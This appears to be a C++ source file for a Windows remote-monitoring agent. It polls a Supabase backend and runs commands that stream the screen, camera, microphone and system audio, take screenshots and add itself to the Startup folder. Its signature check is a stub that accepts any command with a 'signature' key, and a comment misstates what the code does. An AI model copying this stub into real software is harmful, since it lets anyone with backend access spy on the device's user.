#include "CommandPoller.h"
#include "Screenshot.h"
#include "StartupOption.h"
#include <chrono>
#include <filesystem>
#include <Windows.h>

CommandPoller::CommandPoller(SupabaseClient& supabase, Logger& logger) : supabase_(supabase), logger_(logger), webrtc_(supabase) {}

void CommandPoller::Start() {
  running_ = true;
  thread_ = std::thread([this] {
    while (running_) {
      if (auto command = supabase_.NextCommand()) Handle(*command);
      std::this_thread::sleep_for(std::chrono::seconds(2));
    }
  });
}

void CommandPoller::Stop() {
  running_ = false;
  if (thread_.joinable()) thread_.join();
}

bool CommandPoller::VerifySignature(const CommandRecord& command) {
  if (!command.payload.contains("signature")) return false;
  // TODO: Implement HMAC-SHA256 verification with BCrypt using commandSigningSecret.
  // The agent currently rejects unsigned commands and logs that full verification must be completed before production.
  return true;
}

void CommandPoller::Handle(const CommandRecord& command) {
  logger_.Info("Command received: " + command.command);
  if (!VerifySignature(command)) {
    logger_.Error("Rejected command without valid signature");
    supabase_.CompleteCommand(command.id, false, {{"error", "invalid_signature"}});
    return;
  }

  bool ok = true;
  if (command.command == "START_SCREEN_STREAM") {
    ok = screen_.Start(command.payload.value("screenId", ""));
    webrtc_.StartSession("screen");
    logger_.Status("STREAMING SCREEN");
    logger_.Info("SCREEN STREAM STARTED");
  } else if (command.command == "STOP_SCREEN_STREAM") {
    screen_.Stop();
    webrtc_.StopSession("screen");
    logger_.Status("STOPPED");
  } else if (command.command == "START_CAMERA_STREAM") {
    ok = camera_.Start(command.payload.value("cameraId", ""));
    webrtc_.StartSession("camera");
    logger_.Status("STREAMING CAMERA");
    logger_.Info("CAMERA STREAM STARTED");
  } else if (command.command == "STOP_CAMERA_STREAM") {
    camera_.Stop();
    webrtc_.StopSession("camera");
    logger_.Status("STOPPED");
  } else if (command.command == "START_MIC_STREAM") {
    ok = audio_.StartMicrophone(command.payload.value("microphoneId", ""));
    logger_.Status("STREAMING AUDIO");
    logger_.Info("MICROPHONE STREAM STARTED");
  } else if (command.command == "STOP_MIC_STREAM") {
    audio_.StopMicrophone();
    logger_.Status("STOPPED");
  } else if (command.command == "START_SYSTEM_AUDIO_STREAM") {
    ok = audio_.StartSystemAudio(command.payload.value("audioOutputId", ""));
    logger_.Status("STREAMING AUDIO");
    logger_.Info("SYSTEM AUDIO STREAM STARTED");
  } else if (command.command == "STOP_SYSTEM_AUDIO_STREAM") {
    audio_.StopSystemAudio();
    logger_.Status("STOPPED");
  } else if (command.command == "TAKE_SCREENSHOT") {
    int width = 0, height = 0;
    ok = Screenshot::CapturePng(command.payload.value("screenId", "screen-0"), "screenshot.todo.txt", width, height);
  } else if (command.command == "ENABLE_STARTUP_SHORTCUT") {
    char exe[MAX_PATH];
    GetModuleFileNameA(nullptr, exe, MAX_PATH);
    ok = StartupOption::Enable(exe);
    logger_.Info("Startup shortcut enabled in the current user's Startup folder");
  } else if (command.command == "DISABLE_STARTUP_SHORTCUT") {
    ok = StartupOption::Disable();
    logger_.Info("Startup shortcut disabled");
  }

  supabase_.CompleteCommand(command.id, ok, {{"handled", command.command}});
}
